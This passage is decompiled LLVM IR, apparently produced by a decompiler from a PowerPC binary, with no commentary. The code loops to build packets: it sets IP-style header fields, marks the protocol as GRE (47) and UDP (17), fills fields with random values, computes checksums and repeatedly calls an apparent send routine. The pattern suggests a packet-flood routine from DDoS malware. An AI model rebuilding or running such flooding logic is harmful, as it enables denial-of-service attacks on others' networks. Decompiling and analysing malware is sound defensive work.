dec_label_pc_10002d6c:                            ; preds = %dec_label_pc_10002d14
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10002d70 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002d70 = add i32 %v2_10002d70, 6
  %v4_10002d70 = inttoptr i32 %v3_10002d70 to i16*
  store i16 16384, i16* %v4_10002d70, align 2
  br label %dec_label_pc_10002d74

dec_label_pc_10002d74:                            ; preds = %dec_label_pc_10002d14, %dec_label_pc_10002d6c
  store i32 2048, i32* %r0.global-to-local, align 4
  %v2_10002d7c = load i32, i32* %r31.global-to-local, align 4
  %v3_10002d7c = add i32 %v2_10002d7c, 9
  %v4_10002d7c = inttoptr i32 %v3_10002d7c to i8*
  store i8 47, i8* %v4_10002d7c, align 1
  %v0_10002d80 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002d80 = trunc i32 %v0_10002d80 to i16
  %v2_10002d80 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002d80 = add i32 %v2_10002d80, 2
  %v4_10002d80 = inttoptr i32 %v3_10002d80 to i16*
  store i16 %v1_10002d80, i16* %v4_10002d80, align 2
  %v3_10002d84 = load i32, i32* %stack_var_-104, align 4
  store i32 %v5_10002c50, i32* %r11.global-to-local, align 4
  %v1_10002d8c = mul i32 %v3_10002d84, 24
  store i32 %v1_10002d8c, i32* %r9.global-to-local, align 4
  %v0_10002d90 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002d90 = add i32 %v0_10002d90, 24
  %v2_10002d90 = inttoptr i32 %v1_10002d90 to i32*
  %v3_10002d90 = load i32, i32* %v2_10002d90, align 4
  store i32 %v3_10002d90, i32* %r0.global-to-local, align 4
  %v2_10002d94 = add i32 %v0_10002d90, 12
  %v3_10002d94 = inttoptr i32 %v2_10002d94 to i32*
  store i32 %v5_10002c50, i32* %v3_10002d94, align 4
  store i32 4, i32* %r11.global-to-local, align 4
  %v0_10002d9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10002d9c = load i32, i32* %r26.global-to-local, align 4
  %v2_10002d9c = add i32 %v1_10002d9c, %v0_10002d9c
  store i32 %v2_10002d9c, i32* %r9.global-to-local, align 4
  %v1_10002da0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002da0, i32* %r0.global-to-local, align 4
  %v0_10002da4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002da4 = add i32 %v0_10002da4, 16
  %v2_10002da4 = inttoptr i32 %v1_10002da4 to i32*
  %v3_10002da4 = load i32, i32* %v2_10002da4, align 4
  store i32 %v3_10002da4, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10002dac = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002dac, i32* %r0.global-to-local, align 4
  %v1_10002db0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002db0 = add i32 %v1_10002db0, 24
  %v3_10002db0 = inttoptr i32 %v2_10002db0 to i32*
  store i32 %v1_10002dac, i32* %v3_10002db0, align 4
  %v0_10002db4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10002db4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002db4 = add i32 %v1_10002db4, 16
  %v3_10002db4 = inttoptr i32 %v2_10002db4 to i32*
  store i32 %v0_10002db4, i32* %v3_10002db4, align 4
  %v0_10002db8 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002db8 = trunc i32 %v0_10002db8 to i8
  %v2_10002db8 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002db8 = add i32 %v2_10002db8, 1
  %v4_10002db8 = inttoptr i32 %v3_10002db8 to i8*
  store i8 %v1_10002db8, i8* %v4_10002db8, align 1
  %v0_10002dbc = load i32, i32* %r24.global-to-local, align 4
  %v1_10002dbc = trunc i32 %v0_10002dbc to i16
  %v2_10002dbc = load i32, i32* %r30.global-to-local, align 4
  %v3_10002dbc = add i32 %v2_10002dbc, 2
  %v4_10002dbc = inttoptr i32 %v3_10002dbc to i16*
  store i16 %v1_10002dbc, i16* %v4_10002dbc, align 2
  %v0_10002dc0 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002dc0 = trunc i32 %v0_10002dc0 to i16
  %v2_10002dc0 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002dc0 = add i32 %v2_10002dc0, 4
  %v4_10002dc0 = inttoptr i32 %v3_10002dc0 to i16*
  store i16 %v1_10002dc0, i16* %v4_10002dc0, align 2
  %v0_10002dc4 = load i32, i32* %r21.global-to-local, align 4
  %v1_10002dc4 = trunc i32 %v0_10002dc4 to i8
  %v2_10002dc4 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002dc4 = add i32 %v2_10002dc4, 8
  %v4_10002dc4 = inttoptr i32 %v3_10002dc4 to i8*
  store i8 %v1_10002dc4, i8* %v4_10002dc4, align 1
  %v0_10002dc8 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002dc8, label %dec_label_pc_10002dd4, label %dec_label_pc_10002dcc

dec_label_pc_10002dcc:                            ; preds = %dec_label_pc_10002d74
  store i32 16384, i32* %r11.global-to-local, align 4
  %v2_10002dd0 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002dd0 = add i32 %v2_10002dd0, 6
  %v4_10002dd0 = inttoptr i32 %v3_10002dd0 to i16*
  store i16 16384, i16* %v4_10002dd0, align 2
  br label %dec_label_pc_10002dd4

dec_label_pc_10002dd4:                            ; preds = %dec_label_pc_10002d74, %dec_label_pc_10002dcc
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_10002dd8 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002dd8 = add i32 %v2_10002dd8, 9
  %v4_10002dd8 = inttoptr i32 %v3_10002dd8 to i8*
  store i8 17, i8* %v4_10002dd8, align 1
  %v0_10002ddc = call i32 @function_10006318()
  store i32 %v0_10002ddc, i32* %r3.global-to-local, align 4
  %v1_10002de0 = add i32 %v0_10002ddc, -1024
  store i32 %v1_10002de0, i32* %r0.global-to-local, align 4
  %v1_10002de4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002de4 = add i32 %v1_10002de4, 12
  %v3_10002de4 = inttoptr i32 %v2_10002de4 to i32*
  store i32 %v0_10002ddc, i32* %v3_10002de4, align 4
  %v0_10002de8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002de8 = sub i32 -1, %v0_10002de8
  store i32 %v1_10002de8, i32* %r0.global-to-local, align 4
  %v0_10002dec = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002dec, label %dec_label_pc_10002df0, label %dec_label_pc_10002cec

dec_label_pc_10002df0:                            ; preds = %dec_label_pc_10002dd4
  %v1_10002df0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002df0 = add i32 %v1_10002df0, 16
  %v3_10002df0 = inttoptr i32 %v2_10002df0 to i32*
  store i32 %v1_10002de8, i32* %v3_10002df0, align 4
  br label %dec_label_pc_10002cf4

dec_label_pc_10002df8:                            ; preds = %dec_label_pc_10002c74
  %v0_10002df8 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10002df8, i32* %r3.global-to-local, align 4
  store i32 268447232, i32* @lr, align 4
  %v0_10002dfc = call i32 @function_10007d68()
  store i32 %v0_10002dfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002e00

dec_label_pc_10002e00:                            ; preds = %dec_label_pc_10002ae0, %dec_label_pc_10002df8
  store i32 %v0_10002af8, i32* %r0.global-to-local, align 4
  %v1_10002e14 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10002ae8)
  store i32 %v0_10002b2c, i32* %r28.global-to-local, align 4
  store i32 %v0_10002b34, i32* %r29.global-to-local, align 4
  store i32 %v0_10002b3c, i32* %r30.global-to-local, align 4
  store i32 %v0_10002b40, i32* %r31.global-to-local, align 4
  %v0_10002e5c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10002e5c

dec_label_pc_10002e60:                            ; preds = %dec_label_pc_10002c98
  %v3_10002e60 = icmp eq i32 %v1_10002cb0, 0
  store i1 %v3_10002e60, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10002e64

dec_label_pc_10002e64:                            ; preds = %dec_label_pc_10002cf4, %dec_label_pc_10002e60
  store i32 %v5_10002c50, i32* %r0.global-to-local, align 4
  %v0_10002e68 = load i32, i32* %r15.global-to-local, align 4
  %v3_10002e68 = icmp eq i32 %v0_10002e68, 0
  store i1 %v3_10002e68, i1* %cr2_eq.global-to-local, align 1
  %v0_10002e6c = load i32, i32* %r16.global-to-local, align 4
  %v1_10002e6c = add i32 %v0_10002e6c, 8
  store i32 %v1_10002e6c, i32* %r22.global-to-local, align 4
  %v1_10002e70 = add i32 %v0_10002e6c, 52
  store i32 %v1_10002e70, i32* %r24.global-to-local, align 4
  %v3_10002e74 = icmp eq i32 %v5_10002c50, -1
  store i1 %v3_10002e74, i1* %cr7_eq.global-to-local, align 1
  %v0_10002e78 = call i32 @__asm_mfcr()
  store i32 %v0_10002e78, i32* %r3.global-to-local, align 4
  %v1_10002e7c = mul i32 %v0_10002e78, 268435456
  store i32 %v1_10002e7c, i32* %r21.global-to-local, align 4
  %v0_10002e80.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002e80.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10002e80.outer

dec_label_pc_10002e80.outer:                      ; preds = %dec_label_pc_10002f88, %dec_label_pc_10002e64
  %v1_10002e80.ph = phi i1 [ %v1_10002e80.pre, %dec_label_pc_10002e64 ], [ %v1_10002f88, %dec_label_pc_10002f88 ]
  %v0_10002e80.ph = phi i1 [ %v0_10002e80.pre, %dec_label_pc_10002e64 ], [ %v0_10002f88, %dec_label_pc_10002f88 ]
  %v2_10002e80 = or i1 %v1_10002e80.ph, %v0_10002e80.ph
  br label %dec_label_pc_10002e80

dec_label_pc_10002e80:                            ; preds = %dec_label_pc_10002e80.outer, %dec_label_pc_10002e80
  br i1 %v2_10002e80, label %dec_label_pc_10002e80, label %dec_label_pc_10002e84

dec_label_pc_10002e84:                            ; preds = %dec_label_pc_10002e80, %dec_label_pc_10002f88
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10002e94

dec_label_pc_10002e94:                            ; preds = %dec_label_pc_10002ef8, %dec_label_pc_10002e84
  %v0_10002e94 = phi i32 [ %v1_10002f78, %dec_label_pc_10002ef8 ], [ 0, %dec_label_pc_10002e84 ]
  %v1_10002e94 = mul i32 %v0_10002e94, 24
  store i32 %v1_10002e94, i32* %r0.global-to-local, align 4
  %v1_10002e98 = mul i32 %v0_10002e94, 4
  store i32 %v1_10002e98, i32* %r11.global-to-local, align 4
  %v1_10002e9c = load i32, i32* %r20.global-to-local, align 4
  %v2_10002e9c = add i32 %v1_10002e9c, %v1_10002e98
  %v3_10002e9c = inttoptr i32 %v2_10002e9c to i32*
  %v4_10002e9c = load i32, i32* %v3_10002e9c, align 4
  store i32 %v4_10002e9c, i32* %r28.global-to-local, align 4
  %v1_10002ea0 = load i32, i32* %r26.global-to-local, align 4
  %v2_10002ea0 = add i32 %v1_10002ea0, %v1_10002e94
  %v1_10002ea4 = add i32 %v2_10002ea0, 20
  %v2_10002ea4 = inttoptr i32 %v1_10002ea4 to i8*
  %v3_10002ea4 = load i8, i8* %v2_10002ea4, align 1
  %v4_10002ea4 = zext i8 %v3_10002ea4 to i32
  store i32 %v4_10002ea4, i32* %r9.global-to-local, align 4
  %v1_10002ea8 = add i32 %v4_10002e9c, 24
  store i32 %v1_10002ea8, i32* @r31, align 4
  %v1_10002eac = add i32 %v4_10002e9c, 44
  store i32 %v1_10002eac, i32* @r30, align 4
  %v3_10002eb0 = icmp eq i8 %v3_10002ea4, 31
  store i1 %v3_10002eb0, i1* %cr7_eq.global-to-local, align 1
  %tmp35 = icmp ult i8 %v3_10002ea4, 32
  br i1 %tmp35, label %dec_label_pc_10002f90, label %dec_label_pc_10002eb8

dec_label_pc_10002eb8:                            ; preds = %dec_label_pc_10002e94
  %v0_10002eb8 = load i32, i32* %r21.global-to-local, align 4
  %v1_10002eb8 = mul i32 %v0_10002eb8, 16
  %v2_10002eb8 = udiv i32 %v0_10002eb8, 268435456
  %v3_10002eb8 = or i32 %v2_10002eb8, %v1_10002eb8
  store i32 %v3_10002eb8, i32* %r21.global-to-local, align 4
  %v1_10002ebc = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002eb8)
  %v1_10002ec0 = mul nuw i32 %v2_10002eb8, 268435456
  %v2_10002ec0 = urem i32 %v0_10002eb8, 268435456
  %v3_10002ec0 = or i32 %v1_10002ec0, %v2_10002ec0
  store i32 %v3_10002ec0, i32* %r21.global-to-local, align 4
  %v0_10002ec4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002ec4, label %dec_label_pc_10002fc4, label %dec_label_pc_10002ec8

dec_label_pc_10002ec8:                            ; preds = %dec_label_pc_10002f90, %dec_label_pc_10002eb8
  store i32 65535, i32* @r29, align 4
  %v0_10002ed0 = load i32, i32* %r25.global-to-local, align 4
  %v4_10002ed0 = icmp eq i32 %v0_10002ed0, 65535
  store i1 %v4_10002ed0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002ed0, label %dec_label_pc_10002fdc, label %dec_label_pc_10002ed8

dec_label_pc_10002ed8:                            ; preds = %dec_label_pc_10002fc4, %dec_label_pc_10002ec8
  %v1_10002ed8 = phi i32 [ %v1_10002fd4, %dec_label_pc_10002fc4 ], [ 65535, %dec_label_pc_10002ec8 ]
  %v0_10002ed8 = load i32, i32* %r17.global-to-local, align 4
  %v4_10002ed8 = icmp eq i32 %v0_10002ed8, %v1_10002ed8
  store i1 %v4_10002ed8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002ed8, label %dec_label_pc_10002ffc, label %dec_label_pc_10002ee0

dec_label_pc_10002ee0:                            ; preds = %dec_label_pc_10002fdc.dec_label_pc_10002ee0_crit_edge, %dec_label_pc_10002ed8
  %v1_10002ee0 = phi i32 [ %v1_10002ee0.pre, %dec_label_pc_10002fdc.dec_label_pc_10002ee0_crit_edge ], [ %v1_10002ed8, %dec_label_pc_10002ed8 ]
  %v0_10002ee0 = load i32, i32* %r18.global-to-local, align 4
  %v4_10002ee0 = icmp eq i32 %v0_10002ee0, %v1_10002ee0
  store i1 %v4_10002ee0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002ee0, label %dec_label_pc_1000300c, label %dec_label_pc_10002ee8

dec_label_pc_10002ee8:                            ; preds = %dec_label_pc_10002ffc, %dec_label_pc_10002ee0
  %v0_10002ee8 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002ee8, label %dec_label_pc_10003018, label %dec_label_pc_10002eec

dec_label_pc_10002eec:                            ; preds = %dec_label_pc_1000300c, %dec_label_pc_10002ee8
  %v0_10002eec = load i32, i32* %r28.global-to-local, align 4
  %v1_10002eec = add i32 %v0_10002eec, 16
  %v2_10002eec = inttoptr i32 %v1_10002eec to i32*
  %v3_10002eec = load i32, i32* %v2_10002eec, align 4
  store i32 %v3_10002eec, i32* %r0.global-to-local, align 4
  %v1_10002ef0 = load i32, i32* @r31, align 4
  %v2_10002ef0 = add i32 %v1_10002ef0, 16
  %v3_10002ef0 = inttoptr i32 %v2_10002ef0 to i32*
  store i32 %v3_10002eec, i32* %v3_10002ef0, align 4
  %v0_10002ef4 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002ef4, label %dec_label_pc_10002ef8, label %dec_label_pc_10003024

dec_label_pc_10002ef8:                            ; preds = %dec_label_pc_10002eec, %dec_label_pc_10003018, %dec_label_pc_10003024
  %v0_10002ef8 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002ef8 = trunc i32 %v0_10002ef8 to i16
  %v2_10002ef8 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002ef8 = add i32 %v2_10002ef8, 10
  %v4_10002ef8 = inttoptr i32 %v3_10002ef8 to i16*
  store i16 %v1_10002ef8, i16* %v4_10002ef8, align 2
  %v0_10002f00 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10002f00, i32* @r3, align 4
  %v2_10002f04 = call i32 @function_1000491c(i32 %v0_10002f00, i32 20)
  %v3_10002f04 = trunc i32 %v2_10002f04 to i16
  %v4_10002f0c = add i32 %v0_10002f00, 10
  %v5_10002f0c = inttoptr i32 %v4_10002f0c to i16*
  store i16 %v3_10002f04, i16* %v5_10002f0c, align 2
  %v0_10002f10 = load i32, i32* @r31, align 4
  store i32 %v0_10002f10, i32* @r3, align 4
  %v0_10002f14 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002f14 = trunc i32 %v0_10002f14 to i16
  %v3_10002f14 = add i32 %v0_10002f10, 10
  %v4_10002f14 = inttoptr i32 %v3_10002f14 to i16*
  store i16 %v1_10002f14, i16* %v4_10002f14, align 2
  %v2_10002f18 = call i32 @function_1000491c(i32 %v0_10002f10, i32 20)
  %v3_10002f18 = trunc i32 %v2_10002f18 to i16
  %v0_10002f1c = load i32, i32* @r30, align 4
  store i32 %v0_10002f1c, i32* @r4, align 4
  %v3_10002f20 = load i32, i32* @r31, align 4
  %v4_10002f20 = add i32 %v3_10002f20, 10
  %v5_10002f20 = inttoptr i32 %v4_10002f20 to i16*
  store i16 %v3_10002f18, i16* %v5_10002f20, align 2
  %v0_10002f24 = load i32, i32* %r22.global-to-local, align 4
  %v0_10002f28 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002f28 = trunc i32 %v0_10002f28 to i16
  %v2_10002f28 = load i32, i32* @r30, align 4
  %v3_10002f28 = add i32 %v2_10002f28, 6
  %v4_10002f28 = inttoptr i32 %v3_10002f28 to i16*
  store i16 %v1_10002f28, i16* %v4_10002f28, align 2
  %v0_10002f2c = load i32, i32* @r31, align 4
  store i32 %v0_10002f2c, i32* %r3.global-to-local, align 4
  %v0_10002f30 = load i32, i32* @r30, align 4
  %v1_10002f30 = add i32 %v0_10002f30, 4
  %v2_10002f30 = inttoptr i32 %v1_10002f30 to i16*
  %v3_10002f30 = load i16, i16* %v2_10002f30, align 2
  %v4_10002f30 = zext i16 %v3_10002f30 to i32
  %v4_10002f34 = call i32 @function_10004980(i32 %v0_10002f2c, i32 %v0_10002f1c, i32 %v4_10002f30, i32 %v0_10002f24)
  %v5_10002f34 = trunc i32 %v4_10002f34 to i16
  store i32 %v4_10002f34, i32* %r3.global-to-local, align 4
  %v3_10002f38 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002f38, i32* %r0.global-to-local, align 4
  %v0_10002f3c = load i32, i32* %r28.global-to-local, align 4
  %v1_10002f3c = add i32 %v0_10002f3c, 16
  %v2_10002f3c = inttoptr i32 %v1_10002f3c to i32*
  %v3_10002f3c = load i32, i32* %v2_10002f3c, align 4
  store i32 %v3_10002f3c, i32* %r11.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10002f44 = mul i32 %v3_10002f38, 24
  store i32 %v1_10002f44, i32* %r0.global-to-local, align 4
  %v3_10002f48 = load i32, i32* @r30, align 4
  %v4_10002f48 = add i32 %v3_10002f48, 6
  %v5_10002f48 = inttoptr i32 %v4_10002f48 to i16*
  store i16 %v5_10002f34, i16* %v5_10002f48, align 2
  %v0_10002f4c = load i32, i32* %r28.global-to-local, align 4
  %v0_10002f50 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10002f50, i32* %r3.global-to-local, align 4
  %v0_10002f54 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002f54 = load i32, i32* %r26.global-to-local, align 4
  %v2_10002f54 = add i32 %v1_10002f54, %v0_10002f54
  %v0_10002f58 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002f58 = trunc i32 %v0_10002f58 to i16
  %v5_10002f58 = inttoptr i32 %v2_10002f54 to i16*
  store i16 %v3_10002f58, i16* %v5_10002f58, align 2
  %v0_10002f5c = load i32, i32* %r11.global-to-local, align 4
  %v2_10002f5c = add i32 %v2_10002f54, 4
  %v3_10002f5c = inttoptr i32 %v2_10002f5c to i32*
  store i32 %v0_10002f5c, i32* %v3_10002f5c, align 4
  %v0_10002f60 = load i32, i32* %r24.global-to-local, align 4
  %v0_10002f64 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002f64 = trunc i32 %v0_10002f64 to i16
  %v3_10002f64 = add i32 %v2_10002f54, 2
  %v4_10002f64 = inttoptr i32 %v3_10002f64 to i16*
  store i16 %v1_10002f64, i16* %v4_10002f64, align 2
  store i32 268447604, i32* @lr, align 4
  %v6_10002f70 = call i32 @function_10008ab8(i32 %v0_10002f50, i32 %v0_10002f4c, i32 %v0_10002f60, i32 16384, i32 %v2_10002f54, i32 16)
  store i32 %v6_10002f70, i32* %r3.global-to-local, align 4
  %v3_10002f74 = load i32, i32* %stack_var_-104, align 4
  %v1_10002f78 = add i32 %v3_10002f74, 1
  store i32 %v1_10002f78, i32* %r9.global-to-local, align 4
  %v1_10002f7c = load i32, i32* %r19.global-to-local, align 4
  %v2_10002f7c = icmp slt i32 %v1_10002f78, %v1_10002f7c
  %v4_10002f7c = icmp eq i32 %v1_10002f78, %v1_10002f7c
  store i1 %v4_10002f7c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10002f78, i32* %stack_var_-104, align 4
  br i1 %v2_10002f7c, label %dec_label_pc_10002e94, label %dec_label_pc_10002f88

dec_label_pc_10002f88:                            ; preds = %dec_label_pc_10002ef8
  %v0_10002f88 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002f88 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10002f88 = or i1 %v0_10002f88, %v1_10002f88
  br i1 %v2_10002f88, label %dec_label_pc_10002e80.outer, label %dec_label_pc_10002e84

dec_label_pc_10002f90:                            ; preds = %dec_label_pc_10002e94
  %v1_10002f90 = add i32 %v2_10002ea0, 16
  %v2_10002f90 = inttoptr i32 %v1_10002f90 to i32*
  %v3_10002f90 = load i32, i32* %v2_10002f90, align 4
  store i32 %v3_10002f90, i32* %r29.global-to-local, align 4
  %v0_10002f94 = call i32 @function_10006318()
  store i32 %v0_10002f94, i32* %r3.global-to-local, align 4
  %v3_10002f98 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002f98, i32* %r9.global-to-local, align 4
  %v0_10002f9c = load i32, i32* %r21.global-to-local, align 4
  %v1_10002f9c = mul i32 %v0_10002f9c, 16
  %v2_10002f9c = udiv i32 %v0_10002f9c, 268435456
  %v3_10002f9c = or i32 %v2_10002f9c, %v1_10002f9c
  store i32 %v3_10002f9c, i32* %r21.global-to-local, align 4
  %v1_10002fa0 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002f9c)
  %v1_10002fa4 = mul nuw i32 %v2_10002f9c, 268435456
  %v2_10002fa4 = urem i32 %v0_10002f9c, 268435456
  %v3_10002fa4 = or i32 %v1_10002fa4, %v2_10002fa4
  store i32 %v3_10002fa4, i32* %r21.global-to-local, align 4
  %v0_10002fa8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002fa8 = mul i32 %v0_10002fa8, 24
  %v1_10002fac = load i32, i32* %r26.global-to-local, align 4
  %v2_10002fac = add i32 %v1_10002fac, %v1_10002fa8
  store i32 %v2_10002fac, i32* %r9.global-to-local, align 4
  %v1_10002fb0 = add i32 %v2_10002fac, 20
  %v2_10002fb0 = inttoptr i32 %v1_10002fb0 to i8*
  %v3_10002fb0 = load i8, i8* %v2_10002fb0, align 1
  %v4_10002fb0 = zext i8 %v3_10002fb0 to i32
  store i32 %v4_10002fb0, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10002fb0, 64
  %v2_10002fb4 = zext i8 %tmp to i32
  %v3_10002fb4 = lshr i32 %v0_10002f94, %v2_10002fb4
  store i32 %v3_10002fb4, i32* %r3.global-to-local, align 4
  %v0_10002fb8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002fb8 = add i32 %v3_10002fb4, %v0_10002fb8
  store i32 %v2_10002fb8, i32* %r29.global-to-local, align 4
  %v1_10002fbc = load i32, i32* %r28.global-to-local, align 4
  %v2_10002fbc = add i32 %v1_10002fbc, 16
  %v3_10002fbc = inttoptr i32 %v2_10002fbc to i32*
  store i32 %v2_10002fb8, i32* %v3_10002fbc, align 4
  %v0_10002fc0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002fc0, label %dec_label_pc_10002fc4, label %dec_label_pc_10002ec8

dec_label_pc_10002fc4:                            ; preds = %dec_label_pc_10002f90, %dec_label_pc_10002eb8
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10002fc8 = call i32 @function_10006318()
  store i32 %v0_10002fc8, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_10002fd0 = load i32, i32* %r28.global-to-local, align 4
  %v2_10002fd0 = add i32 %v1_10002fd0, 12
  %v3_10002fd0 = inttoptr i32 %v2_10002fd0 to i32*
  store i32 %v0_10002fc8, i32* %v3_10002fd0, align 4
  %v0_10002fd4 = load i32, i32* %r25.global-to-local, align 4
  %v1_10002fd4 = load i32, i32* @r29, align 4
  %v4_10002fd4 = icmp eq i32 %v0_10002fd4, %v1_10002fd4
  store i1 %v4_10002fd4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002fd4, label %dec_label_pc_10002fdc, label %dec_label_pc_10002ed8

dec_label_pc_10002fdc:                            ; preds = %dec_label_pc_10002fc4, %dec_label_pc_10002ec8
  %v0_10002fdc = call i32 @function_10006318()
  %v0_10002fe0 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002fe0 = load i32, i32* @r29, align 4
  %v4_10002fe0 = icmp eq i32 %v0_10002fe0, %v1_10002fe0
  store i1 %v4_10002fe0, i1* %cr7_eq.global-to-local, align 1
  %v1_10002fe4 = urem i32 %v0_10002fdc, 65536
  store i32 %v1_10002fe4, i32* %r3.global-to-local, align 4
  %v1_10002fe8 = add nsw i32 %v1_10002fe4, -1000
  store i32 %v1_10002fe8, i32* %r0.global-to-local, align 4
  %v1_10002fec = trunc i32 %v0_10002fdc to i16
  %v2_10002fec = load i32, i32* %r28.global-to-local, align 4
  %v3_10002fec = add i32 %v2_10002fec, 4
  %v4_10002fec = inttoptr i32 %v3_10002fec to i16*
  store i16 %v1_10002fec, i16* %v4_10002fec, align 2
  %v0_10002ff0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002ff0 = sub i32 -1, %v0_10002ff0
  store i32 %v1_10002ff0, i32* %r0.global-to-local, align 4
  %v1_10002ff4 = trunc i32 %v1_10002ff0 to i16
  %v2_10002ff4 = load i32, i32* @r31, align 4
  %v3_10002ff4 = add i32 %v2_10002ff4, 4
  %v4_10002ff4 = inttoptr i32 %v3_10002ff4 to i16*
  store i16 %v1_10002ff4, i16* %v4_10002ff4, align 2
  br i1 %v4_10002fe0, label %dec_label_pc_10002ffc, label %dec_label_pc_10002fdc.dec_label_pc_10002ee0_crit_edge

dec_label_pc_10002fdc.dec_label_pc_10002ee0_crit_edge: ; preds = %dec_label_pc_10002fdc
  %v1_10002ee0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10002ee0

dec_label_pc_10002ffc:                            ; preds = %dec_label_pc_10002fdc, %dec_label_pc_10002ed8
  %v0_10002ffc = call i32 @function_10006318()
  %v1_10002ffc = trunc i32 %v0_10002ffc to i16
  store i32 %v0_10002ffc, i32* %r3.global-to-local, align 4
  %v0_10003000 = load i32, i32* %r18.global-to-local, align 4
  %v1_10003000 = load i32, i32* @r29, align 4
  %v4_10003000 = icmp eq i32 %v0_10003000, %v1_10003000
  store i1 %v4_10003000, i1* %cr7_eq.global-to-local, align 1
  %v3_10003004 = load i32, i32* %r28.global-to-local, align 4
  %v4_10003004 = add i32 %v3_10003004, 44
  %v5_10003004 = inttoptr i32 %v4_10003004 to i16*
  store i16 %v1_10002ffc, i16* %v5_10003004, align 2
  br i1 %v4_10003000, label %dec_label_pc_1000300c, label %dec_label_pc_10002ee8

dec_label_pc_1000300c:                            ; preds = %dec_label_pc_10002ffc, %dec_label_pc_10002ee0
  %v0_1000300c = call i32 @function_10006318()
  %v1_1000300c = trunc i32 %v0_1000300c to i16
  store i32 %v0_1000300c, i32* %r3.global-to-local, align 4
  %v3_10003010 = load i32, i32* @r30, align 4
  %v4_10003010 = add i32 %v3_10003010, 2
  %v5_10003010 = inttoptr i32 %v4_10003010 to i16*
  store i16 %v1_1000300c, i16* %v5_10003010, align 2
  %v0_10003014 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003014, label %dec_label_pc_10003018, label %dec_label_pc_10002eec

dec_label_pc_10003018:                            ; preds = %dec_label_pc_1000300c, %dec_label_pc_10002ee8
  %v0_10003018 = call i32 @function_10006318()
  store i32 %v0_10003018, i32* %r3.global-to-local, align 4
  %v1_1000301c = load i32, i32* @r31, align 4
  %v2_1000301c = add i32 %v1_1000301c, 16
  %v3_1000301c = inttoptr i32 %v2_1000301c to i32*
  store i32 %v0_10003018, i32* %v3_1000301c, align 4
  %v0_10003020 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003020, label %dec_label_pc_10002ef8, label %dec_label_pc_10003024

dec_label_pc_10003024:                            ; preds = %dec_label_pc_10002eec, %dec_label_pc_10003018
  %v0_10003024 = load i32, i32* @r30, align 4
  %v1_10003024 = add i32 %v0_10003024, 8
  store i32 %v1_10003024, i32* @r3, align 4
  %v0_10003028 = load i32, i32* %r16.global-to-local, align 4
